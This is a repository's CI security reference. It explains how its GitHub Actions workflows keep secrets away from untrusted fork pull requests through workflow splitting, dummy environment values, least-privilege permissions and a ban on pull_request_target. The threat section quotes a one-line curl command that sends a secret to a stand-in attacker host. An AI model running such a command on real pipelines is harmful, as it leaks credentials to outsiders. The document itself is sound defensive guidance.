# CI / GitHub Actions security

Deep reference for how CI keeps secrets safe from untrusted pull requests. The
always-on invariants are summarized in `AGENTS.md`; this file has the full
mechanics. Read it before touching `.github/workflows/`, adding a secret to a
workflow, or wiring real infra (Azure SQL / SCCH) into CI.

## The threat

This is a teaching repo (Teaching-HTL-Leonding) — **anyone can fork it and open a
pull request**, and a PR can change *any* file CI executes: a test, a build step,
a script. So PR code is **untrusted code that runs on our runners**. If a workflow
exposes a secret (an LLM API key, a database credential, the deploy webhook) to a
job that runs PR code, that PR can exfiltrate it — e.g. `curl evil.com -d "$SECRET"`.

The defense is simple to state: **the workflows that run untrusted PR code must
have no secrets in their environment, and the workflows that have secrets must not
run untrusted PR code.**

## How the two workflows are split

| Workflow | Trigger | Runs PR (untrusted) code? | Has secrets? |
| --- | --- | --- | --- |
| **`qa.yml`** | `pull_request` to `main`, `workflow_call` | **Yes** | **No** — secret-free |
| **`docs.yml`** | `pull_request` to `main` (teacher-docs paths) | **Yes** | **No** — secret-free |
| **`docker-publish.yml`** | `push` to `main`, `workflow_dispatch` | No | Yes |

- **`qa.yml`** is the per-PR quality gate (biome, typecheck, unit + component
  tests, `next build`, Playwright e2e — hermetic + DB-backed `@live-db` — and a
  production **Docker image build**). It runs untrusted fork code, so it is
  **secret-free by construction**: it references no `secrets.*`, sets
  `permissions: contents: read`, and feeds only **test-only dummy values** in its
  `env:` block. Those dummies exist because `auth.ts` calls `required()` for the
  `AZURE_*` vars and `TEACHER_GROUP_ID` at module load (also during `next build`),
  and `AUTH_SECRET` only has to *match* between the e2e helpers and the dev server —
  e2e tests mint Auth.js session cookies directly, so no real Entra round-trip
  happens. There is nothing real in this environment to steal.
  - The `e2e` job runs an **ephemeral SQL Server 2022 service container** so the
    DB-backed `@live-db` tests run on every PR. This stays secret-free: the
    container's `MSSQL_SA_PASSWORD` is a **non-secret dummy literal**, the app
    reaches it with throwaway **SQL auth** (not Entra), and the database is
    discarded with the runner. No `secrets.*`, no real Azure SQL.
  - The `prod-build` job (PR-only — `if: github.event_name == 'pull_request'`)
    reproduces `docker-publish.yml`'s multi-stage image build so a build break
    surfaces on the PR instead of after merge. It is **also secret-free**: it never
    logs in to a registry and **`push: false`**, so no `DOCKER_*` credentials are
    needed; it only **reads** the layer cache (`cache-from: type=gha`, no cache
    export — write is restricted for fork PR tokens). On a `main` push
    (`workflow_call`) this job is skipped because `docker-publish.yml` does the real
    build+push.
- **`docs.yml`** is the light teacher-guide gate for PRs `qa.yml` skips via its
  `**.md` paths-ignore (corpus regenerations under `teacher-docs/`): site unit
  tests, workspace typecheck, `docs:build`. It runs untrusted fork code like
  `qa.yml`, so the same rule applies: **no secrets, no env, `contents: read`** —
  and none are needed, the docs build touches no app code.
- **`docker-publish.yml`** holds the real secrets (`DOCKER_USERNAME` /
  `DOCKER_PASSWORD`, `AZURE_WEBAPP_CI_CD_URL`). It triggers **only** on `push` to
  `main` (a maintainer merge) and manual `workflow_dispatch`. A fork PR cannot
  produce a push to `main`, so it can never reach these secrets. It reuses `qa.yml`
  via `workflow_call` as a gate, then builds/publishes/deploys.

## GitHub's built-in protections we rely on

1. **Secrets are withheld from fork `pull_request` runs.** GitHub does not pass
   repository or organization secrets to a workflow triggered by `pull_request`
   from a fork, and the `GITHUB_TOKEN` is read-only there. This is automatic — even
   if `qa.yml` *did* reference a secret, a fork PR run wouldn't receive it. We don't
   rely on that alone (qa.yml references none), but it is the backstop.
2. **`pull_request_target` is banned here.** That trigger runs in the *base* repo
   context **with** secrets; it is only safe while it checks out the base ref. It
   becomes a secret-leak the moment it checks out and runs PR head code. **Do not
   introduce `pull_request_target`** in this repo.
3. **External-contributor approval is required.** In repo/org Settings → Actions →
   General → *Fork pull request workflows*, the setting is
   **"Require approval for all external contributors"** — a maintainer must click
   *Approve and run* before any workflow runs for an outside contributor. This also
   guards runner abuse (crypto-mining, etc.) on the secret-free workflow. This is a
   GitHub UI setting, not in the repo — keep it on.

## Invariants (do not break these)

- **`qa.yml` stays secret-free.** Never add a `secrets.*` reference or a real
  credential to a workflow that runs on `pull_request`. The `env:` block is
  dummies only.
- **No real credentials on a fork `pull_request`.** The live tag is split:
  `@live-db` (needs a SQL Server, no LLM) runs in CI against the **ephemeral
  container** above — safe because the container is a non-secret dummy, not real
  infra. `@live-llm` (needs the SCCH LLM — geo-blocked to Austria +
  un-containerizable) and `@live-storage` (needs **real Azure Blob Storage** for the
  image subsystem — no container substitutes for it, and the User-Delegation SAS
  path needs the passwordless data-store credential) are both excluded from the PR
  run via `npm run test:e2e:ci` (`--grep-invert "@live-llm|@live-storage"`) and run
  local-only. Tests against **real** Azure SQL, SCCH, or Azure Blob Storage must run
  only on a **trusted trigger** — `push` to `main`, a `schedule`, or a
  reviewer-gated GitHub *Environment* — never on fork PR code.
- **Keep `permissions:` least-privilege.** `qa.yml` only reads code and runs
  tests, so `contents: read`. Any workflow that needs more should request the
  minimum it needs, scoped to the job.
- **No `pull_request_target`.** See protection 2 above.
